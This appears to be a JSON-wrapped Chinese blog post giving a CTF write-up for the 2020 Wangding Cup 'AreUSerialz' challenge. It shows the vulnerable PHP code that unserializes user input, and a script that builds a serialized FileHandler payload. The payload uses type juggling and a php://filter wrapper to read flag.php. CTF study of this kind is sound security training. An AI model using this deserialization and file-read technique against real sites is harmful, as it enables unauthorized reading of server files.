{"title":"网鼎杯 2020 青龙组AreUSerialz","uid":"65a2832de802174240ebcdfabdb1247d","slug":"网鼎杯-2020-青龙组AreUSerialz","date":"2023-06-27T07:40:26.000Z","updated":"2023-06-27T07:43:59.984Z","comments":true,"path":"api/articles/网鼎杯-2020-青龙组AreUSerialz.json","keywords":null,"cover":null,"content":"<pre class=\"line-numbers language-none\"><code class=\"language-none\">&lt;?php\n\ninclude(&quot;flag.php&quot;);\n\nhighlight_file(__FILE__);\n\nclass FileHandler &#123;\n\n    protected $op;\n    protected $filename;\n    protected $content;\n\n    function __construct() &#123;    &#x2F;&#x2F;初始化数值，调用process()函数\n        $op &#x3D; &quot;1&quot;;\n        $filename &#x3D; &quot;&#x2F;tmp&#x2F;tmpfile&quot;;\n        $content &#x3D; &quot;Hello World!&quot;;\n        $this-&gt;process();\n    &#125;\n\n    public function process() &#123;     &#x2F;&#x2F;若$op为1，执行write()函数，若$op为2,调用read()函数，将结果赋值给$res,output $res\n        if($this-&gt;op &#x3D;&#x3D; &quot;1&quot;) &#123;\n            $this-&gt;write();\n        &#125; else if($this-&gt;op &#x3D;&#x3D; &quot;2&quot;) &#123;\n            $res &#x3D; $this-&gt;read();\n            $this-&gt;output($res);\n        &#125; else &#123;\n            $this-&gt;output(&quot;Bad Hacker!&quot;);\n        &#125;\n    &#125;\n\n    private function write() &#123;      &#x2F;&#x2F;将content内容写入filename\n        if(isset($this-&gt;filename) &amp;&amp; isset($this-&gt;content)) &#123;\n            if(strlen((string)$this-&gt;content) &gt; 100) &#123;\n                $this-&gt;output(&quot;Too long!&quot;);\n                die();\n            &#125;\n            $res &#x3D; file_put_contents($this-&gt;filename, $this-&gt;content);\n            if($res) $this-&gt;output(&quot;Successful!&quot;);\n            else $this-&gt;output(&quot;Failed!&quot;);\n        &#125; else &#123;\n            $this-&gt;output(&quot;Failed!&quot;);\n        &#125;\n    &#125;\n\n    private function read() &#123;       &#x2F;&#x2F;获取filename文件的内容\n        $res &#x3D; &quot;&quot;;\n        if(isset($this-&gt;filename)) &#123;\n            $res &#x3D; file_get_contents($this-&gt;filename);\n        &#125;\n        return $res;\n    &#125;\n\n    private function output($s) &#123;   &#x2F;&#x2F;打印\n        echo &quot;[Result]: &lt;br&gt;&quot;;\n        echo $s;\n    &#125;\n\n    function __destruct() &#123;\n        if($this-&gt;op &#x3D;&#x3D;&#x3D; &quot;2&quot;)\n            $this-&gt;op &#x3D; &quot;1&quot;;\n        $this-&gt;content &#x3D; &quot;&quot;;\n        $this-&gt;process();\n    &#125;\n\n&#125;\n\nfunction is_valid($s) &#123;\n    for($i &#x3D; 0; $i &lt; strlen($s); $i++)\n        if(!(ord($s[$i]) &gt;&#x3D; 32 &amp;&amp; ord($s[$i]) &lt;&#x3D; 125))\n            return false;\n    return true;\n&#125;\n\nif(isset($_GET&#123;&#39;str&#39;&#125;)) &#123;\n\n    $str &#x3D; (string)$_GET[&#39;str&#39;];\n    if(is_valid($str)) &#123;\n        $obj &#x3D; unserialize($str);\n    &#125;\n\n&#125;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>反序列化漏洞，__construct()构造函数中调用process()方法，op&#x3D;&#x3D;”2”时执行read()读取文件，令op&#x3D;2弱比较绕过，$filename&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php读取flag文件内容</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">&lt;?php\n\nclass FileHandler &#123;\n    public $op &#x3D; 2;\n    public $filename &#x3D; &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php&quot;;\n    public $content &#x3D; &quot;xxxx&quot;;\n&#125;\n$a &#x3D; new FileHandler();\n$b &#x3D; serialize($a);\necho($b);\n?&gt;\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n","feature":true,"text":"&lt;?php include(&quot;flag.php&quot;); highlight_file(__FILE__); class FileHandler &#123; protected $op; protected $filename; protected $co...","link":"","photos":[],"count_time":{"symbolsCount":"3k","symbolsTime":"3 mins."},"categories":[],"tags":[],"toc":"","author":{"name":"Aurora","slug":"blog-author","avatar":"https://img-blog.csdnimg.cn/20210313122054101.png","link":"/","description":"","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"BUU SQL COURSE 1","uid":"acd1299be9c20688d202948dec0f6033","slug":"BUU-SQL-COURSE-1","date":"2023-06-27T11:20:27.000Z","updated":"2023-06-27T11:22:01.465Z","comments":true,"path":"api/articles/BUU-SQL-COURSE-1.json","keywords":null,"cover":null,"text":"F12在网络请求中能看到消息头中的信息 http://3b8efbe2-8da1-4516-9363-9a838fcda70c.node4.buuoj.cn:81/backend/content_detail.php?id=1 明显为SQL注入的形式，order by 2判断为两...","link":"","photos":[],"count_time":{"symbolsCount":155,"symbolsTime":"1 mins."},"categories":[],"tags":[],"author":{"name":"Aurora","slug":"blog-author","avatar":"https://img-blog.csdnimg.cn/20210313122054101.png","link":"/","description":"","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"feature":true},"next_post":{"title":"EIS 2019-EzPOP","uid":"0914970e2b91842e13e1a7baa380ec14","slug":"EIS-2019-EzPOP","date":"2023-06-26T12:02:46.000Z","updated":"2023-06-26T13:12:56.939Z","comments":true,"path":"api/articles/EIS-2019-EzPOP.json","keywords":null,"cover":null,"text":"base64算法解码时是4个字节一组 文件名filename构建：filename&#x3D;options[‘prefix’].$name $name&#x3D;A::key $data&#x3D;$value&#x3D;A::$contents&#x3D;$cleaned,$...","link":"","photos":[],"count_time":{"symbolsCount":736,"symbolsTime":"1 mins."},"categories":[],"tags":[],"author":{"name":"Aurora","slug":"blog-author","avatar":"https://img-blog.csdnimg.cn/20210313122054101.png","link":"/","description":"","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"feature":true}}